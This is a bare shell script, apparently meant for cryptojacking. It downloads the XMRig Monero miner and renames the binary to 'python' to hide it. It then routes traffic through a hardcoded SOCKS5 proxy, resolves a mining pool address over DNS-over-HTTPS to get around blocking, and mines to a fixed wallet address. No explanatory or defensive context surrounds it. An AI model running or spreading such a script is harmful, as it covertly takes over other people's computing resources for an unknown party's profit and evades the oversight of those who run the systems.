wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar -xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
mv xmrig python
sudo apt update
sudo apt install jq -y
sudo apt install proxychains -y
sudo echo "[ProxyList]" > /etc/proxychains.conf
sudo echo "socks5  67.201.33.10  25283" >> /etc/proxychains.conf
ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=us-west.minexmr.com&type=A' | jq -r '.Answer[0].data')
proxychains ./python -o $ip:4444 -u 878g8ZsJ65oWcPxsugXyWaS7Eo2peDZpdGxZSVBuMb2kZXr9YC1LbMp86KXs3eoVHfGhNtNS417PRWfRK8nqLN8pSwRnKEN
